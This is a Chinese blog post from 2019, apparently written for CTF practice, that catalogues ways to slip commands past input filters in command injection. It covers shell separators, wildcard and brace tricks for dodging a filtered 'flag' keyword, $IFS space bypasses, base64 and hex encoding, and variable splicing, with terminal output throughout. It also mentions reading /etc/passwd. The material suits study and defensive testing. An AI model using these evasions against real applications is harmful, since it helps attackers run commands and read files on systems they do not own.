<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>命令注入的绕过姿势 ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">命令注入的绕过姿势</p>
            <br>
            
            <p>Monday, July 29th 2019, 9:46 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="命令注入的绕过姿势"><a href="#命令注入的绕过姿势" class="headerlink" title="命令注入的绕过姿势"></a>命令注入的绕过姿势</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令注入是我们常见的漏洞，在CTF中也经常见到。这里学习一波命令注入的骚姿势。</p>
<h2 id="命令注入中常用的符号"><a href="#命令注入中常用的符号" class="headerlink" title="命令注入中常用的符号"></a>命令注入中常用的符号</h2><p>说到命令注入，我们不得不提到命令注入中几个常用的符号。</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><pre><code>&amp; 表示将任务置于后台执行
</code></pre><pre><code>➜  ~ whoami &amp; ls
[1] 1782
root
[1]  + 1782 done       whoami
anaconda-ks.cfg  install.log  install.log.syslog

</code></pre><h3 id="管道符号"><a href="#管道符号" class="headerlink" title="|( 管道符号)"></a>|( 管道符号)</h3><pre><code>| 表示管道，上一条命令的输出，作为下一条命令的参数
</code></pre><pre><code>➜  ~ ls | whoami
root
➜  ~ whoami | ls
anaconda-ks.cfg  install.log  install.log.syslog

</code></pre><p>执行的是<code>|</code>后面的命令。</p>
<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><pre><code>语法格式如下：
command1 &amp;&amp; command2 [&amp;&amp; command3 ...]
1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。
2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。
3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。
</code></pre><p>只有前面的命令是真，后面的命令才会被执行</p>
<pre><code>➜  ~ cat aaa &amp;&amp; ls
cat: aaa: 没有那个文件或目录
➜  ~ touch a.txt
➜  ~ echo &#39;abc&#39; &gt; a.txt
➜  ~ cat a.txt &amp;&amp; whoami
abc
root

</code></pre><h3 id=""><a href="#" class="headerlink" title="||"></a>||</h3><pre><code>语法格式如下：
command1 || command2 [|| command3 ...]
1 命令之间使用 || 连接，实现逻辑或的功能。
2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。
3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。
</code></pre><p>该用法和<code>&amp;&amp;</code>正好相反，只有前面的命令是假的，后面的命令才会被执行。</p>
<pre><code>➜  ~ cat a.txt || whoami
abc
➜  ~ cat a || whoami
cat: a: 没有那个文件或目录
root
➜  ~

</code></pre><h3 id="；-分号"><a href="#；-分号" class="headerlink" title="；(分号)"></a>；(分号)</h3><pre><code>多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块

</code></pre><p>无论前面，命令是否为真，都会被执行</p>
<pre><code>➜  ~ cat a.txt;whoami
abc
root
➜  ~ cat a;whoami
cat: a: 没有那个文件或目录
root

</code></pre><h3 id="和"><a href="#和" class="headerlink" title="和$()"></a><code></code>和$()</h3><pre><code>在bash中，$( )与` `（反引号）都是用来作命令替换的。
各自的优缺点：
1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。
2. $()更有可读性，但是$()并不是所有shell都支持。
</code></pre><pre><code>root@kali:~/chuddy# $(whoami)
bash: root：未找到命令
root@kali:~/chuddy# $(cat a.txt)
bash: abc：未找到命令
root@kali:~/chuddy# $(ls)
bash: 1562578910726843：未找到命令
root@kali:~/chuddy# $(ls)
bash: 1562578910726843：未找到命令
root@kali:~/chuddy# echo `ls`
1562578910726843 a.txt ctf rip-git.pl web
root@kali:~/chuddy# `ls`
bash: 1562578910726843：未找到命令
root@kali:~/chuddy# 

</code></pre><p>尝试发现如果直接使用，发现能回返回第一行的结果以及<code>bash: root：未找到命令</code>,可以和<code>echo</code>一起使用。<code>echo $(ls)</code> </p>
<h3 id="和-1"><a href="#和-1" class="headerlink" title="()和{}"></a>()和{}</h3><pre><code>如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。
(command1;command2;command3....)
{ command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号

相同点：
()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开
不同点
()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行
()最后一个命令可以不用分号,{}最后一个命令要用分号
()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格
()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令
</code></pre><pre><code>root@kali:~/chuddy# (ls;whoami)
1562578910726843  a.txt  ctf  rip-git.pl  web
root

root@kali:~/chuddy# {ls;whoami}
bash: {ls：未找到命令
bash: whoami}：未找到命令

root@kali:~/chuddy# {ls;whoami;}
bash: 未预期的符号“}”附近有语法错误

root@kali:~/chuddy# { ls;whoami;}
1562578910726843  a.txt  ctf  rip-git.pl  web
root

root@kali:~/chuddy# { ls;whoami}
&gt; ;
bash: 未预期的符号“;”附近有语法错误

root@kali:~/chuddy# { ls;whoami;}
1562578910726843  a.txt  ctf  rip-git.pl  web
root
root@kali:~/chuddy# 

</code></pre><p>测试发现bash下对{}是又要求的，但是我使用zsh主题的情况下，是不受{}规则的影响的</p>
<pre><code>➜  ~ { ls;whoami}
anaconda-ks.cfg  a.txt  install.log  install.log.syslog
root
➜  ~ { ls;whoami}
anaconda-ks.cfg  a.txt  install.log  install.log.syslog
root
➜  ~ {ls;whoami}
anaconda-ks.cfg  a.txt  install.log  install.log.syslog
root
➜  ~ {ls;whoami;}
anaconda-ks.cfg  a.txt  install.log  install.log.syslog
root
➜  ~

</code></pre><h3 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h3><pre><code>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。

</code></pre><p>使用比较多的命令：</p>
<pre><code>命令说明：
command &gt; file：将输出重定向到 file。
command &lt; file：将输入重定向到 file。
command &gt;&gt; file：将输出以追加的方式重定向到 file。
</code></pre><pre><code>➜  ~ echo &#39;abcd&#39; &lt; a.txt
abcd
➜  ~ cat a.txt
abc

➜  ~ echo &#39;123&#39; &gt;a.txt
➜  ~ cat a.txt
123

➜  ~ echo &#39;abc&#39; &gt;&gt; a.txt
➜  ~ cat a.txt
123
abc
➜  ~

</code></pre><p>直接用<code>&gt;</code> 会覆盖原文件的内容，用<code>&gt;&gt;</code>能够追加写入文件，不会覆盖原文件。</p>
<h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符的使用"><a href="#通配符的使用" class="headerlink" title="通配符的使用"></a>通配符的使用</h3><p>可以绕过一些关键字的限制。</p>
<p><strong><code>?</code>：匹配任何一个字符</strong></p>
<p>存在文件<code>flag.php</code>,并且过滤了关键字flag的情况下进行文件读取</p>
<pre><code>➜  ~ cat f?a?.???
flag{abc_123_haha}
➜  ~ cat ????????  //会读取所有他匹配的文档
flag{abc_123_haha}
➜  ~ touch fake.txt
➜  ~ echo &#39;this_is_a_text&#39; &gt;fake.txt
➜  ~ cat ????????
this_is_a_text
flag{abc_123_haha}
➜  ~

</code></pre><p><strong><code>*</code>：匹配任何字符串／文本，包括空字符串</strong></p>
<pre><code>➜  ~ cat f*  //会读取所有他匹配的文档
this_is_a_text
flag{abc_123_haha}
➜  ~ cat fl*
flag{abc_123_haha}
➜  ~ cat fla*
flag{abc_123_haha}
➜  ~

</code></pre><p><strong>[]和{}的使用</strong></p>
<p><code>[....]</code>：匹配范围中任何一个字符<br><code>[a-z]</code>：匹配a-z范围中任何一个字符<br> <code>{a,b}</code>：对以逗号分割的文件列表进行拓展</p>
<pre><code>➜  ~ cat fl[abc]g.php
flag{abc_123_haha}
➜  ~ cat fl[a-z]g.php
flag{abc_123_haha}
➜  ~ cat fl[bc]g.php
zsh: no matches found: fl[bc]g.php
➜  ~ cat fl{a,b,c}g.php
flag{abc_123_haha}
cat: flbg.php: 没有那个文件或目录
cat: flcg.php: 没有那个文件或目录
➜  ~ cat fl{b,c}g.php
cat: flbg.php: 没有那个文件或目录
cat: flcg.php: 没有那个文件或目录
➜  ~

</code></pre><p>它们的区别：<code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p>
<p><strong>注意</strong></p>
<p>在使用过程中应该注意：</p>
<p>   上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，<code>?</code>或<code>*</code>这样的通配符，不能匹配路径分隔符（<code>/</code>）。 如果要匹配子目录里面的文件，可以写成下面这样。</p>
<pre><code>➜  ~ ls */*.txt
admin/admin.txt
➜  ~ ls ?????/*.txt
admin/admin.txt
➜  ~ ls ./?????/*.txt
./admin/admin.txt
</code></pre><ol start="4">
<li><p>可用于文件名。</p>
<p>Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。</p>
</li>
</ol>
<pre><code>➜  ~touch a*
➜  ~ ls
➜  ~touch &#39;a*&#39;
➜  ~ ls
a*

</code></pre><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p><strong>使用<code>&lt;</code>或者<code>&lt;&gt;</code></strong></p>
<pre><code>➜  ~ cat&lt;a.txt
abc
➜  ~ cat&lt;&gt;a.txt #需要写的权限
abc
➜  ~

</code></pre><p><strong>使用<code>IFS</code></strong></p>
<pre><code>root@kali:~/chuddy# cat$IFSa.txt 
bash: cat.txt：未找到命令
root@kali:~/chuddy# cat$IFS$9a.txt
abc
root@kali:~/chuddy# cat${IFS}a.txt
abc
root@kali:~/chuddy# cat$IFS./a.txt
abc
oot@kali:~/chuddy# cat$IFS\./a.txt
abc

</code></pre><p><strong>在<code>url</code>的编码绕过</strong></p>
<pre><code>%20(space)
+
%09(tab)
%3c(&lt;)
</code></pre><p><strong>花括号拓展<code>{OS_COMMAND,ARGUMENT}</code></strong></p>
<p>在<code>Linux bash</code>中还可以使用<code>{cat,/etc/passwd}</code>来绕过，如果使用zsh主题就不能执行。</p>
<pre><code>root@kali:~/chuddy# {cat,a.txt}
abc

</code></pre><p><strong>变量控制</strong></p>
<pre><code>root@kali:~/chuddy# X=$&#39;cat\x09./a.txt&#39;&amp;&amp;$X
abc
root@kali:~/chuddy# X=$&#39;cat\x20./a.txt&#39;&amp;&amp;$X
abc

</code></pre><h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><p>在<code>Unix</code>上:</p>
<pre><code>%0a  //没成功
%0d  //没成功
;
&amp;
|
||
&amp;&amp;
$(shell_command)
`shell_command`
{ shell_command;}

</code></pre><p>在<code>Windows</code>上：</p>
<pre><code>%0a
&amp;
|
%1a - 一个神奇的角色，作为.bat文件中的命令分隔符

</code></pre><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p><strong>空变量</strong></p>
<p>使用<code>$*</code>和<code>$@</code>，<code>$x(x代表1-9)</code>,<code>${x}(x&gt;=10)</code>(我尝试小于10也是可以的)<br>PS：因为在没有传参的情况下，上面的特殊变量都是为空的</p>
<pre><code>root@kali:~/chuddy# c$*at a.txt
abc
root@kali:~/chuddy# ca$@t a.txt
abc
root@kali:~/chuddy# ca$2t a.txt
abc
root@kali:~/chuddy# ca$10t a.txt
bash: ca0t：未找到命令
root@kali:~/chuddy# ca${10}t a.txt
abc
root@kali:~/chuddy# ca${7}t a.txt
abc


</code></pre><p><strong>反斜杠</strong></p>
<pre><code>root@kali:~/chuddy# ca\t a.txt
abc

</code></pre><p><strong>变量替换</strong></p>
<pre><code>root@kali:~/chuddy# a=ca;b=t;c=a.txt;$a$b $c
abc

root@kali:~/chuddy# a=&quot;abctx. &quot;;b=${a:2:1}${a:0:1}${a:3:1}${a:6:1}${a:0:1}${a:5:1}${a:3:1}${a:4:1}${a:3:1};$b  //b=cat a.txt
abc

</code></pre><p><strong>引号</strong></p>
<pre><code>root@kali:~/chuddy# c&#39;a&#39;t a.txt
abc
root@kali:~/chuddy# c&quot;a&quot;t a.txt
abc

</code></pre><p><strong>编码绕过</strong></p>
<p>base64编码：</p>
<pre><code>root@kali:~/chuddy# echo &#39;cat a.txt&#39;| base64
Y2F0IGEudHh0Cg==
root@kali:~/chuddy# `echo &#39;Y2F0IGEudHh0Cg==&#39; | base64 -d`
abc

</code></pre><p>十六进制：</p>
<pre><code>root@kali:~/chuddy# echo &#39;cat a.txt&#39; | xxd -p
63617420612e7478740a
root@kali:~/chuddy# `echo &#39;0x63617420612e7478740a&#39;| xxd -r -p`
abc
root@kali:~/chuddy# 

root@kali:~/chuddy# $(printf &quot;\x63\x61\x74\x20\x61\x2e\x74\x78\x74\x0a&quot;)
abc

</code></pre><p><strong>利用已有资源与字符</strong></p>
<pre><code>root@kali:~/chuddy# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

root@kali:~/chuddy# echo $PATH|cut -c 8
c
root@kali:~/chuddy# echo $PATH|cut -c 9
a

root@kali:~/chuddy# `echo $PATH|cut -c 8`at a.txt

abc

root@kali:~/chuddy# c`echo $PATH|cut -c 9`t a.txt

abc


</code></pre>
                <hr>
                <div>
                    <p>
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>